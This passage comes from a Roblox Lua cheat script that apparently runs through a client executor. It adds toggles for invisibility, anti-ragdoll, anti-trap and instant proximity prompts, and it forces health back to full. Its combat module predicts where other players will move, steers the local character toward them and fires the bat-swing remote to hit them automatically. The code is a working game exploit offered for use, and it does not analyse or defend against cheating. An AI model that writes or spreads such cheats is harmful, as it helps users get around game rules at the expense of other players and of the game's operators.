			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			if not v19 or not humanoidRootPart or v19.Health <= 0 then
				return
			end
			local flag8 = fn14(character) and not tbl4.Steal.Active and not tbl4.Flying

			if flag8 then
				flag8 = (tbl4.Driving or 0) == 0
			end

			if flag8 then
				flag8 = not (tbl4.Treadmill and tbl4.Treadmill.Riding)
			end

			if not (flag8 and not v19.Sit and not v19.PlatformStand) then
				if v18 == v19 then
					v18 = nil

					pcall(function()
						v19.AutoRotate = true
					end)
				end

				return
			end

			if v19.AutoRotate then
				pcall(function()
					v19.AutoRotate = false
				end)
			end

			v18 = v19
			local moveDirection = v19.MoveDirection
			local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)

			if vector.Magnitude > 0.01 then
				pcall(function()
					humanoidRootPart.CFrame = CFrame.lookAt(humanoidRootPart.Position, humanoidRootPart.Position + vector.Unit)
				end)
			end
		end)

		tbl4.InvisibilityHandle = v14:CreateToggle({
			Name = "Invisibility",
			Note = "Makes you invisible to other players",
			Default = false,
			Callback = function()
				local str2 = nil

				if type(tbl4.CombatActive) == "function" and tbl4.CombatActive() then
					str2 = "Auto Hit"
				end

				if tbl4.Toggle(v16, false) and str2 then
					flag3 = false
					local v19 = v16

					tbl4.UiDefer(function()
						pcall(v19.Set, v19, false, false)
						tbl4.Notify("Invisibility", "Turn off " .. str2 .. " first, both cannot be on at the same time")
					end)

					return
				end

				flag3 = tbl4.Toggle(v16, false) == true

				if fn11() and not fn14(localPlayer.Character) and tbl4.Movement.Owner == nil then
					tbl4.Movement.Owner = "invisibility"
				end
			end,
		})

		fn4(function()
			flag4 = false
			connection:Disconnect()
			connection3:Disconnect()
			pcall(task.cancel, thread)
			tbl12.Paused = false
			tbl4.ShieldPaused = false
			tbl4.ReleaseMovement("invisibility")
		end)
	end

	local tbl25
	tbl25 = { BallSocketConstraint = true, NoCollisionConstraint = true, HingeConstraint = true }
	local tbl26

	tbl26 = {
		[Enum.HumanoidStateType.Physics] = true,
		[Enum.HumanoidStateType.Ragdoll] = true,
		[Enum.HumanoidStateType.FallingDown] = true,
	}

	local n7
	n7 = 0.5
	local v16

	do
		local n8 = 5
		local n9 = 0

		v16 = fn2(function()
			return ReplicatedStorage.Shared.Modules.Ragdoll
		end)

		local v17 = nil

		local function fn11()
			if v17 then
				return v17
			end

			local ok, result = pcall(function()
				return require(localPlayer:WaitForChild("PlayerScripts", 5):WaitForChild("PlayerModule", 5)):GetControls()
			end)

			if ok then
				v17 = result
			end

			return v17
		end

		local v18 = nil
		local flag3 = false
		local connection = nil
		local n10 = 0
		local fn12 = nil
		local tbl27 = {}
		local tbl28 = {}
		local n11 = 0
		local v19 = nil
		local humanoid = nil

		local function fn13(arg)
			for _, v20 in ipairs(arg) do
				if v20.Connected then
					v20:Disconnect()
				end
			end

			table.clear(arg)
		end

		local function fn14(arg)
			tbl27[#tbl27 + 1] = arg
		end

		local function fn15(arg)
			tbl28[#tbl28 + 1] = arg
		end

		local function fn16()
			if not v19 or not humanoid then
				return
			end
			local humanoidRootPart = v19:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart then
				return
			end
			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			local n12 = humanoid.WalkSpeed + n8
			local y = assemblyLinearVelocity.Y
			local flag4 = false

			if n12 < vector.Magnitude then
				vector = vector.Unit * n12
				flag4 = true
			end

			if n9 < y then
				y = n9
				flag4 = true
			end

			if flag4 then
				pcall(function()
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(vector.X, y, vector.Z)
				end)
			end
		end

		local function fn17()
			if type(v16) ~= "table" then
				return
			end

			if type(v16.ClearClientRagdoll) == "function" then
				pcall(v16.ClearClientRagdoll)
			end

			if type(v16.Unragdoll) == "function" then
				pcall(v16.Unragdoll, v19)
			end
		end

		local function fn18()
			if not v19 or not v19.Parent then
				return
			end

			for _, descendant in ipairs(v19:GetDescendants()) do
				if tbl25[descendant.ClassName] then
					pcall(function()
						descendant:Destroy()
					end)
				end
			end
		end

		local function fn19()
			if not v19 or not v19.Parent then
				return
			end

			for _, descendant in ipairs(v19:GetDescendants()) do
				if descendant:IsA("Motor6D") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				elseif descendant:IsA("AnimationConstraint") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				end
			end
		end

		local function fn20()
			local v20 = fn11()

			if v20 and v20.controlsEnabled == false then
				pcall(function()
					v20:Enable()
				end)
			end
		end

		local function fn21()
			local currentCamera = workspace.CurrentCamera

			if currentCamera and humanoid and currentCamera.CameraSubject ~= humanoid then
				pcall(function()
					currentCamera.CameraSubject = humanoid
				end)
			end
		end

		local function fn22()
			if not humanoid or not humanoid.Parent or humanoid.Health <= 0 then
				return
			end

			if tbl26[humanoid:GetState()] then
				pcall(function()
					humanoid:ChangeState(Enum.HumanoidStateType.Running)
				end)
			end

			if humanoid.PlatformStand then
				humanoid.PlatformStand = false
			end
		end

		local function fn23()
			if type(v16) == "table" and type(v16.IsRagdolled) == "function" then
				local ok, result = pcall(v16.IsRagdolled, v19)
				if ok and result == true then
					return true
				end
			end

			local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
			return num ~= nil and num > workspace:GetServerTimeNow()
		end

		local n12 = 21

		local function fn24()
			if tbl4.AntiGuard.Busy == true then
				return true
			end

			if (tonumber(tbl4.AntiGuard.HitArms) or 0) <= 0 then
				return false
			end
			return os.clock() - (tonumber(tbl4.AntiGuard.HitArmedAt) or 0) <= n12
		end

		local function fn25()
			if not humanoid or not humanoid.Parent then
				return false
			end

			if humanoid.PlatformStand then
				return true
			end
			return tbl26[humanoid:GetState()] == true
		end

		local function fn26()
			if not v19 or not v19.Parent then
				return false
			end

			for _, child in ipairs(v19:GetChildren()) do
				if tbl25[child.ClassName] then
					return true
				end

				if child:IsA("BasePart") then
					for _, child2 in ipairs(child:GetChildren()) do
						if tbl25[child2.ClassName] then
							return true
						end
					end
				end
			end

			return false
		end

		local function fn27()
			fn16()
			fn17()
			fn18()
			fn19()
			fn22()
			fn20()
			fn21()
		end

		local function fn28()
			if not flag3 or fn24() then
				return
			end
			n10 = os.clock() + n7
		end

		local function fn29()
			local character = localPlayer.Character

			if character ~= v19 then
				if character then
					fn12(character)
				else
					n11 += 1
					fn13(tbl28)
					v19 = nil
					humanoid = nil
				end

				return
			end

			if not v19 then
				return
			end

			if v19:FindFirstChildOfClass("Humanoid") ~= humanoid then
				fn12(v19)
			end
		end

		local function fn30()
			if not flag3 then
				return
			end
			fn29()
			if not v19 or not humanoid or humanoid.Health <= 0 then
				return
			end

			if fn24() then
				n10 = 0
				return
			end
			local now = os.clock()

			if fn25() or fn23() or fn26() then
				n10 = now + n7
			end

			if now <= n10 then
				fn27()
			end
		end

		fn12 = function(arg)
			n11 += 1
			local v20 = n11
			fn13(tbl28)
			v19 = arg
			humanoid = nil
			if not flag3 or not arg then
				return
			end
			humanoid = arg:FindFirstChildOfClass("Humanoid")
			if not flag3 or n11 ~= v20 or arg ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid") then
				return
			end

			fn15(humanoid.StateChanged:Connect(function(old, new)
				if flag3 and tbl26[new] then
					fn28()
				end
			end))

			fn15(humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
				if flag3 and humanoid and humanoid.PlatformStand then
					fn28()
				end
			end))

			fn15(arg.DescendantAdded:Connect(function(descendant)
				if flag3 and tbl25[descendant.ClassName] then
					fn28()
				end
			end))

			fn15(arg.ChildAdded:Connect(function(child)
				if flag3 and child:IsA("Humanoid") and child ~= humanoid then
					task.defer(fn29)
				end
			end))

			fn21()

			if fn23() then
				fn28()
			end
		end

		local function fn31()
			flag3 = false
			n11 += 1
			n10 = 0

			if connection then
				pcall(function()
					connection:Disconnect()
				end)

				connection = nil
			end

			fn13(tbl28)
			fn13(tbl27)
			v19 = nil
			humanoid = nil
		end

		local function fn32()
			fn31()
			flag3 = true
			fn11()
			connection = RunService.Heartbeat:Connect(fn30)

			fn14(localPlayer.CharacterAdded:Connect(function(character)
				if flag3 then
					task.defer(function()
						if flag3 and character == localPlayer.Character then
							fn12(character)
						end
					end)
				end
			end))

			fn14(localPlayer.CharacterRemoving:Connect(function(character)
				if flag3 and character == v19 then
					n11 += 1
					n10 = 0
					fn13(tbl28)
					v19 = nil
					humanoid = nil
				end
			end))

			fn14(localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
				if flag3 then
					fn28()
				end
			end))

			local clientRagdollRemote = type(v16) == "table" and v16.ClientRagdollRemote or nil

			if typeof(clientRagdollRemote) == "Instance" and clientRagdollRemote:IsA("RemoteEvent") then
				fn14(clientRagdollRemote.OnClientEvent:Connect(function()
					if flag3 and not fn24() then
						fn16()
						fn28()
					end
				end))
			end

			fn14(tbl4.OnHumanoidChanged(function()
				if flag3 and localPlayer.Character then
					fn12(localPlayer.Character)
				end
			end))

			if localPlayer.Character then
				fn12(localPlayer.Character)
			end
		end

		fn4(fn31)

		v18 = v14:CreateToggle({
			Name = "Anti Ragdoll",
			Default = true,
			Callback = function()
				if tbl4.Toggle(v18, false) then
					fn32()
				else
					fn31()
				end
			end,
		})
	end

	do
		local flag3 = false
		local tbl27 = {}

		local function fn11()
			for _, v17 in ipairs(tbl27) do
				pcall(function()
					v17:Disconnect()
				end)
			end

			table.clear(tbl27)
		end

		local function fn12(arg)
			if flag3 and arg.Parent and arg.Health > 0 and arg.Health < arg.MaxHealth then
				pcall(function()
					arg.Health = arg.MaxHealth
				end)
			end
		end

		local function fn13(arg)
			fn11()
			if not flag3 or not arg then
				return
			end
			local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
			if not flag3 or not humanoid or not humanoid:IsA("Humanoid") or arg ~= localPlayer.Character then
				return
			end

			table.insert(tbl27, humanoid.HealthChanged:Connect(function()
				fn12(humanoid)
			end))

			table.insert(tbl27, RunService.Heartbeat:Connect(function()
				fn12(humanoid)
			end))

			fn12(humanoid)
		end

		local connection = localPlayer.CharacterAdded:Connect(function(character)
			if flag3 then
				task.defer(fn13, character)
			end
		end)

		local v17 = tbl4.OnHumanoidChanged(function()
			if flag3 and localPlayer.Character then
				fn13(localPlayer.Character)
			end
		end)

		fn4(function()
			flag3 = false
			connection:Disconnect()
			v17:Disconnect()
			fn11()
		end)

		flag3 = true

		if localPlayer.Character then
			task.spawn(fn13, localPlayer.Character)
		end
	end

	do
		local v17 = nil
		local flag3 = true
		local tbl27 = {}
		local tbl28 = {}

		local function fn11(arg)
			if arg:IsA("BasePart") and tbl27[arg] == nil then
				tbl27[arg] = arg.CanTouch

				pcall(function()
					arg.CanTouch = false
				end)
			end
		end

		local function fn12(arg)
			if not flag3 or not arg.Parent then
				return
			end
			local name = localPlayer.Name
			if arg:GetAttribute("Owner") == name then
				return
			end
			fn11(arg)

			for _, descendant in ipairs(arg:GetDescendants()) do
				fn11(descendant)
			end

			table.insert(tbl28, arg.DescendantAdded:Connect(function(descendant)
				if flag3 then
					fn11(descendant)
				end
			end))
		end

		local function fn13()
			for _, v18 in ipairs(CollectionService:GetTagged("PlacedTrap")) do
				fn12(v18)
			end
		end

		local function fn14()
			for k, v18 in pairs(tbl27) do
				if k.Parent then
					pcall(function()
						k.CanTouch = v18
					end)
				end
			end

			table.clear(tbl27)
		end

		table.insert(tbl28, CollectionService:GetInstanceAddedSignal("PlacedTrap"):Connect(function(arg)
			task.defer(fn12, arg)
		end))

		v17 = v14:CreateToggle({
			Name = "Anti Trap",
			Note = "Traps from other players cannot catch you",
			Default = true,
			Callback = function()
				flag3 = tbl4.Toggle(v17, true) == true

				if flag3 then
					fn13()
				else
					fn14()
				end
			end,
		})

		fn13()

		fn4(function()
			flag3 = false

			for _, v18 in ipairs(tbl28) do
				pcall(function()
					v18:Disconnect()
				end)
			end

			table.clear(tbl28)
			fn14()
		end)
	end

	do
		local v17 = nil
		local str2 = "CarryAreaEgg"
		local tbl27 = { ClaimLostPart = true }
		local tbl28 = {}
		local connection = nil
		local connection2 = nil

		local function fn11(arg)
			if not arg:IsA("ProximityPrompt") or tbl27[arg.Name] then
				return
			end

			if tbl28[arg] == nil then
				if arg.HoldDuration <= 0 and arg.Name ~= str2 then
					return
				end
				tbl28[arg] = arg.HoldDuration
			end

			if arg.HoldDuration ~= 0 then
				pcall(function()
					arg.HoldDuration = 0
				end)
			end
		end

		local function fn12(arg)
			if arg.Name ~= "SmartPromptPart" then
				return nil
			end
			local carryAreaEgg = arg:FindFirstChild("CarryAreaEgg")
			return carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and carryAreaEgg or nil
		end

		tbl4.PromptHold = function(arg)
			local v18 = tbl28[arg]
			if type(v18) == "number" then
				return v18
			end
			return arg.HoldDuration
		end

		local function fn13()
			if connection then
				return
			end

			connection2 = ProximityPromptService.PromptShown:Connect(function(arg)
				if tbl4.Toggle(v17, true) then
					fn11(arg)
				end
			end)

			for _, child in ipairs(workspace:GetChildren()) do
				local v18 = fn12(child)

				if v18 then
					fn11(v18)
				end
			end

			connection = workspace.ChildAdded:Connect(function(child)
				if child.Name ~= "SmartPromptPart" then
					return
				end

				task.defer(function()
					local carryAreaEgg = child:FindFirstChild("CarryAreaEgg") or child:WaitForChild("CarryAreaEgg", 2)

					if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and tbl4.Toggle(v17, true) then
						fn11(carryAreaEgg)
					end
				end)
			end)
		end

		local function fn14()
			for k, v18 in pairs(tbl28) do
				if k and k.Parent then
					pcall(function()
						k.HoldDuration = v18
					end)
				end
			end

			table.clear(tbl28)

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end
		end

		tbl4.PressStealPrompt = function(arg)
			if typeof(fireproximityprompt) ~= "function" or not arg then
				return false
			end
			local v18 = nil
			local huge = math.huge

			for _, child in ipairs(workspace:GetChildren()) do
				local v19 = fn12(child)

				if v19 and child:IsA("BasePart") then
					local magnitude = (child.Position - arg).Magnitude

					if magnitude < huge then
						v18 = v19
						huge = magnitude
					end
				end
			end

			if not v18 or huge > 14 then
				return false
			end

			if tbl4.Toggle(v17, true) then
				pcall(function()
					v18.HoldDuration = 0
				end)
			end

			local ok = pcall(fireproximityprompt, v18)

			if ok and v18.HoldDuration > 0 then
				task.wait(v18.HoldDuration + 0.1)
			end

			return ok
		end

		tbl3.Add(function()
			if tbl4.Toggle(v17, true) then
				fn13()

				for k in pairs(tbl28) do
					if not k.Parent then
						tbl28[k] = nil
					elseif k.HoldDuration ~= 0 then
						pcall(function()
							k.HoldDuration = 0
						end)
					end
				end
			elseif next(tbl28) ~= nil or connection then
				fn14()
			end

			return false
		end)

		v17 = v14:CreateToggle({
			Name = "Instant Prompts",
			Default = true,
			Callback = function()
				tbl3.Wake()
			end,
		})

		fn4(fn14)
	end

	tbl4.Combat = {}
	local combat
	combat = tbl4.Combat
	local n8, n9, n10, n11, n12, n13, n14, n15, n16, n17
	local tbl27

	do
		local n18 = 15
		local n19 = 2
		n8 = 0.05
		n9 = 1
		n10 = 0.18
		n11 = -0.275
		n12 = 0.6
		n13 = 6
		n14 = 1.1
		n15 = 0.8
		n16 = 2.5
		n17 = 35
		local n20 = 0.12
		local n21 = 6
		local n22 = 6
		local n23 = 3
		local tbl28 = { 0.12, 0.2, 0.28, 0.36, 0.46, 0.6 }
		local tbl29 = { ["WALL LEFT"] = true, ["WALL RIGHT"] = true }

		tbl27 = {
			Trigger = nil,
			LastFire = 0,
			Trace = 0,
			EquipAt = 0,
			Walls = {},
			WallsAt = 0,
			WallSide = setmetatable({}, { __mode = "k" }),
			Tracks = setmetatable({}, { __mode = "k" }),
			Stats = {},
			Option = 3,
			Pending = {},
			Holders = {},
			SpawnRagdoll = nil,
		}

		for i = 1, #tbl28 do
			tbl27.Stats[i] = { Hits = 0, Shots = 0 }
		end

		local raycastParams = RaycastParams.new()
		raycastParams.FilterType = Enum.RaycastFilterType.Exclude

		pcall(function()
			raycastParams.RespectCanCollide = true
		end)

		local function fn11()
			return workspace:GetServerTimeNow()
		end

		local function fn12()
			local trigger = tbl27.Trigger
			if trigger and trigger.Parent then
				return trigger
			end
			local reBatSwingTrigger = networking:FindFirstChild("RE/BatSwing/Trigger")
			tbl27.Trigger = reBatSwingTrigger
			return reBatSwingTrigger
		end

		local function fn13(arg)
			return tonumber(arg:GetAttribute("RagdollEndTime")) or 0
		end

		combat.SetLead = function(arg)
			n11 = math.clamp((tonumber(arg) or -275) / 1000, -0.4, 0.1)
		end

		combat.SetSweep = function(arg)
			n12 = math.clamp((tonumber(arg) or 60) / 100, 0, 2.5)
		end

		combat.Ragdolled = function(arg)
			return fn13(arg) > fn11()
		end

		combat.SelfRagdolled = function()
			local v17 = fn13(localPlayer)
			if v17 <= fn11() then
				return false
			end
			return v17 ~= tbl27.SpawnRagdoll
		end

		combat.Humanoid = function(arg)
			if not arg then
				return nil
			end
			local v17 = nil

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("Humanoid") then
					if child.Health > 0 then
						return child
					end
					v17 = v17 or child
				end
			end

			return v17
		end

		local function fn14(arg)
			local gears = tbl.Gears
			local directory = type(gears) == "table" and gears.Directory or nil
			local flag3 = type(directory) == "table"

			if flag3 then
				flag3 = directory[tostring(arg:GetAttribute("GearName") or arg.Name)]
			end

			flag3 = flag3 or nil
			local batControllerData = type(flag3) == "table" and flag3.BatControllerData or nil
			return type(batControllerData) == "table" and tonumber(batControllerData.RangeBonus) or 0
		end

		combat.Range = function(arg)
			local n24 = workspace:GetAttribute("DragonEggEventActive") == true and 2.5 or 1
			return (n18 + n19 + (arg and fn14(arg) or 0)) * n24
		end

		combat.PickBat = function(arg)
			local tool = arg:FindFirstChildWhichIsA("Tool")
			if tool and tbl4.IsBatTool(tool) then
				return tool
			end
			local v17, v18, v19 = ipairs({ arg, localPlayer:FindFirstChildOfClass("Backpack") })
			local n24 = -1
			local v20 = nil

			for _, v21 in v17, v18, v19 do
				if v21 then
					for _, child in ipairs(v21:GetChildren()) do
						if tbl4.IsBatTool(child) then
							local v22 = fn14(child)

							if v22 > n24 then
								n24 = v22
								v20 = child
							end
						end
					end
				end
			end

			return v20
		end

		local function fn15(parent, arg, arg2)
			if arg2.Parent == parent then
				return true
			end
			local equipAt = tbl27.EquipAt
			if os.clock() - equipAt < 0.2 then
				return false
			end
			tbl27.EquipAt = os.clock()

			pcall(function()
				arg:EquipTool(arg2)
			end)

			if arg2.Parent ~= parent then
				pcall(function()
					arg2.Parent = parent
				end)
			end

			return arg2.Parent == parent
		end

		combat.Parts = function(arg)
			arg = arg and arg.Character
			local humanoidRootPart = arg and arg:FindFirstChild("HumanoidRootPart")
			local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")
			if not humanoidRootPart or not humanoid or humanoid.Health <= 0 then
				return nil, nil
			end
			return arg, humanoidRootPart
		end

		combat.Hittable = function(arg)
			if not arg or arg == localPlayer or arg.Parent ~= Players then
				return false
			end
			local v17, v18 = combat.Parts(arg)
			if not v17 then
				return false
			end

			if v17:GetAttribute("IsTrapped") == true or arg:GetAttribute("InBossArena") then
				return false
			end
			return not tbl4.InsideBase(v18.Position)
		end

		local function fn16()
			local wallsAt = tbl27.WallsAt
			if os.clock() < wallsAt then
				return tbl27.Walls
			end
			tbl27.WallsAt = os.clock() + 5
			local walls = {}
			local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
			world = world and world:FindFirstChild("Build")

			if world then
				for _, child in ipairs(world:GetChildren()) do
					local collisions = child:FindFirstChild("COLLISIONS")
					collisions = collisions and collisions:FindFirstChild("GUARD NO COLLIDE")

					if collisions then
						for _, child2 in ipairs(collisions:GetChildren()) do
							if tbl29[child2.Name] then
								if child2:IsA("BasePart") then
									table.insert(walls, child2)
								end

								for _, descendant in ipairs(child2:GetDescendants()) do
									if descendant:IsA("BasePart") then
										table.insert(walls, descendant)
									end
								end
							end
						end
					end
				end
			end

			tbl27.Walls = walls
			return walls
		end

		local function fn17(arg)
			if arg.X <= arg.Y and arg.X <= arg.Z then
				return "X", "Y", "Z"
			end

			if arg.Y <= arg.Z then
				return "Y", "X", "Z"
			end
			return "Z", "X", "Y"
		end

		local function fn18(arg)
			local n24 = math.abs(arg.RightVector.Y)
			local n25 = math.abs(arg.UpVector.Y)
			local n26 = math.abs(arg.LookVector.Y)
			if n24 >= n25 and n24 >= n26 then
				return "X"
			end

			if n26 <= n25 then
				return "Y"
			end
			return "Z"
		end

		local function fn19(arg, arg2, arg3, arg4)
			if arg3 == arg4 then
				return true
			end
			local n24 = arg2[arg3] + n21
			return math.abs(arg[arg3]) <= n24
		end

		local function fn20(arg, arg2)
			for _, v17 in ipairs(fn16()) do
				if v17.Parent then
					local cFrame = v17.CFrame
					local size = v17.Size
					local v18, v19, v20 = fn17(size)
					local v21 = fn18(cFrame)
					local n24 = size / 2
					local v22 = cFrame:PointToObjectSpace(arg2)

					if fn19(v22, n24, v19, v21) and fn19(v22, n24, v20, v21) then
						local v23 = cFrame:PointToObjectSpace(arg)
						local n25 = math.abs(v23[v18])
						local n26 = tbl27.WallSide[v17]

						if n25 >= n24[v18] + n21 * 0.5 or n26 == nil and n25 >= n24[v18] then
							n26 = v23[v18] >= 0 and 1 or -1
							tbl27.WallSide[v17] = n26
						elseif n26 == nil then
							n26 = v23[v18] >= 0 and 1 or -1
						end

						local n27 = n24[v18] + n21

						if v22[v18] * n26 < n27 then
							local tbl30 = { X = v22.X, Y = v22.Y, Z = v22.Z, [v18] = n26 * n27 }
							arg2 = cFrame:PointToWorldSpace(Vector3.new(tbl30.X, tbl30.Y, tbl30.Z))
						end
					end
				end
			end

			return arg2
		end

		combat.KeepOffWalls = function(arg, arg2)
			local v17 = fn20(arg, arg2)
			local n24 = v17 - arg

			if n21 < n24.Magnitude then
				local v18 = arg

				for i = 1, 6 do
					local n25 = arg + n24 * i / n22
					local v19 = fn20(v18, n25)
					if (v19 - n25).Magnitude > 0.01 then
						return fn20(arg, v19)
					end
					v18 = v19
				end
			end

			return v17
		end

		combat.ResetWalls = function()
			table.clear(tbl27.WallSide)
		end

		local n24 = 0
		local v17 = nil

		local function fn21(arg)
			local character = localPlayer.Character

			if os.clock() - n24 > 0.5 or character ~= v17 then
				n24 = os.clock()
				v17 = character
				local filterDescendantsInstances = {}

				for _, player in ipairs(Players:GetPlayers()) do
					if player.Character then
						table.insert(filterDescendantsInstances, player.Character)
					end
				end

				raycastParams.FilterDescendantsInstances = filterDescendantsInstances
			end

			local hit = workspace:Raycast(arg + Vector3.new(0, 60, 0), Vector3.new(0, -400, 0), raycastParams)
			if hit and arg.Y < hit.Position.Y + n23 then
				return Vector3.new(arg.X, hit.Position.Y + n23, arg.Z)
			end
			return arg
		end

		local function fn22(arg, arg2)
			local tbl30 = tbl27.Tracks[arg]

			if not tbl30 then
				tbl30 = { Samples = {}, Smooth = nil, Heading = nil }
				tbl27.Tracks[arg] = tbl30
			end

			local now = os.clock()
			local samples = tbl30.Samples
			table.insert(samples, { Time = now, Position = arg2.Position })

			while #samples > 2 and now - samples[1].Time > n20 do
				table.remove(samples, 1)
			end

			local assemblyLinearVelocity = arg2.AssemblyLinearVelocity
			local v18 = samples[1]
			local n25 = now - v18.Time

			if n25 >= 0.03 then
				local n26 = (arg2.Position - v18.Position) / n25

				if n26.Magnitude <= 1500 and assemblyLinearVelocity.Magnitude <= n26.Magnitude * 1.4 then
					assemblyLinearVelocity = n26
				end
			end

			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			tbl30.Smooth = tbl30.Smooth and tbl30.Smooth:Lerp(vector, 0.25) or vector
			local smooth = tbl30.Smooth

			if smooth.Magnitude > 1 then
				local heading = tbl30.Heading and tbl30.Heading:Lerp(smooth.Unit, 0.25) or smooth.Unit
				tbl30.Heading = heading.Magnitude > 0.01 and heading.Unit or smooth.Unit
			end

			return assemblyLinearVelocity, vector, smooth, tbl30
		end

		local function fn23()
			local n25 = 0

			for _, stat in ipairs(tbl27.Stats) do
				n25 += stat.Shots
			end

			local option = tbl27.Option
			local n26 = -math.huge

			for i, stat in ipairs(tbl27.Stats) do
				local n27 = stat.Shots + 1
				local n28 = (stat.Hits + 1) / (stat.Shots + 2) + math.sqrt(2 * math.log(n25 + 2) / n27) * 0.35

				if n28 > n26 then
					n26 = n28
					option = i
				end
			end

			tbl27.Option = option
			return option
		end

		local function fn24()
			local now = os.clock()

			for i = #tbl27.Pending, 1, -1 do
				local v18 = tbl27.Pending[i]
				local v19 = tbl27.Stats[v18.Option]
				local n25 = v18.RagdollBefore + 0.01

				if fn13(v18.Target) > n25 then
					v19.Hits = v19.Hits + 1
					v19.Shots = v19.Shots + 1
					table.remove(tbl27.Pending, i)
				elseif v18.Wait < now - v18.At then
					if v18.CooldownBefore + 0.01 < (v18.Tool and tonumber(v18.Tool:GetAttribute("CooldownEndTime")) or 0) then
						v19.Shots = v19.Shots + 1
					end

					table.remove(tbl27.Pending, i)
				end
			end
		end

		combat.Plan = function(arg, arg2, arg3, arg4)
			if not arg3 then
				local v18
				v18, arg3 = combat.Parts(arg)
			end

			if not arg3 or not arg3.Parent then
				return nil
			end
			local n25 = math.clamp(localPlayer:GetNetworkPing(), 0, 1)
			local n26 = math.clamp(n25 + n8, 0.05, 0.35)
			local v18, v19, v20, v21 = fn22(arg or arg3, arg3)
			local v22 = fn23()
			local v23 = tbl28[v22]
			local position = arg3.Position
			local n27 = position + v18 * math.max(0, v23 + n25 - n26)
			local n28 = position + v18 * (v23 + n25)
			local magnitude = v20.Magnitude
			local heading = v21.Heading

			if not heading then
				local vector = Vector3.new(arg2.Position.X - position.X, 0, arg2.Position.Z - position.Z)
				heading = vector.Magnitude > 0.1 and vector.Unit or Vector3.new(0, 0, 1)
			end

			local character = localPlayer.Character
			local v24 = combat.Range(character and combat.PickBat(character) or nil)
			local n29 = position + v20 * (n25 + v23 + n10 + n11) + (magnitude > 1 and v20.Unit * n13 * n12 or Vector3.zero)
			local n30 = math.max(5, math.min(v24 * 0.7, 6 + magnitude * 0.07)) * n12
			local now = os.clock()
			local n31 = (math.sin(now * 2 * 3.1415926535897931 / n14) * 0.5 + 0.5) * n30
			local n32 = math.sin(now * 2 * 3.1415926535897931 / n15) * n16
			local vector = Vector3.new(-heading.Z, 0, heading.X)

			if vector:Dot(arg2.Position - n29) < 0 then
				vector = -vector
			end

			local n33 = n29 + heading * n31 + vector * (v19.Magnitude < n17 and 3 or 1.5) + Vector3.new(0, n32, 0)
			local position2 = arg2.Position

			if not arg4 then
				position2 = combat.KeepOffWalls(arg2.Position, fn21(Vector3.new(n33.X, n33.Y, position.Z)))
			end

			return {
				Goal = position2,
				Velocity = Vector3.new(v20.X, 0, v20.Z),
				Face = n28,
				Current = n28,
				Historical = n27,
				Option = v22,
				Distance = (position - arg2.Position).Magnitude,
			}
		end

		combat.Steer = function(arg, arg2, arg3, arg4, arg5)
			local n25 = math.max(arg5, 0.0041666666666666666)
			local velocity = arg2.Velocity
			local n26 = velocity + (arg2.Goal - arg.Position) / math.max(0.12, n25)
			local n27 = math.min(arg3 + velocity.Magnitude, arg4)

			if n26.Magnitude > n27 then
				n26 = n26.Unit * n27
			end

			local position = arg.Position
			local n28 = position + n26 * n25
			local v18 = combat.KeepOffWalls(position, n28)

			if (v18 - n28).Magnitude > 0.01 then
				n26 = (v18 - position) / n25
			end

			local v19 = combat.KeepOffWalls(position, position)

			if (v19 - position).Magnitude > 0.01 then
				n26 = (v19 - position) / math.max(0.12, n25)
			end

			local assemblyLinearVelocity = n26 + Vector3.new(0, workspace.Gravity * n25 * 0.5, 0)

			pcall(function()
				local vector = Vector3.new(arg2.Face.X - position.X, 0, arg2.Face.Z - position.Z)

				if vector.Magnitude > 0.05 then
					arg.CFrame = CFrame.lookAt(position, position + vector.Unit)
				end

				arg.AssemblyLinearVelocity = assemblyLinearVelocity
				arg.AssemblyAngularVelocity = Vector3.zero
			end)
		end

		combat.TryHit = function(arg, arg2)
			fn24()
			if workspace:GetAttribute("PvPDisabled") == true then
				return "Player hits are off right now"
			end
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local v18 = combat.Humanoid(character)
			if not humanoidRootPart or not v18 or v18.Health <= 0 then
				return "Waiting for your character"
			end
			local v19 = combat.PickBat(character)
			if not v19 then
				return "No bat found"
			end

			if not fn15(character, v18, v19) then
				return "Equipping " .. tostring(v19:GetAttribute("GearName") or v19.Name)
			end

			if not combat.Hittable(arg) or combat.Ragdolled(arg) then
				return nil
			end
			arg2 = arg2 or combat.Plan(arg, humanoidRootPart)
			if not arg2 then
				return nil
			end
			local n25 = combat.Range(v19) - n9
			local n26 = humanoidRootPart.Position - humanoidRootPart.AssemblyLinearVelocity * n10
			if (arg2.Historical - n26).Magnitude > n25 and (arg2.Current - n26).Magnitude > n25 then
				return nil
			end
			local v20 = fn12()
			if not v20 then
				return nil
			end
			local n27 = math.clamp(localPlayer:GetNetworkPing(), 0, 1)
			local n28 = tonumber(v19:GetAttribute("CooldownEndTime")) or 0
			if fn11() < n28 - n27 * 0.5 then
				return nil
			end
			local lastFire = tbl27.LastFire
			if os.clock() - lastFire < math.max(0.12, n27 * 1.5) then
				return nil
			end
			tbl27.LastFire = os.clock()
			tbl27.Trace = tbl27.Trace + 1

			table.insert(tbl27.Pending, {
				Target = arg,
				Option = arg2.Option,
				At = os.clock(),
				Wait = math.max(0.5, n27 * 2 + 0.3),
				RagdollBefore = fn13(arg),
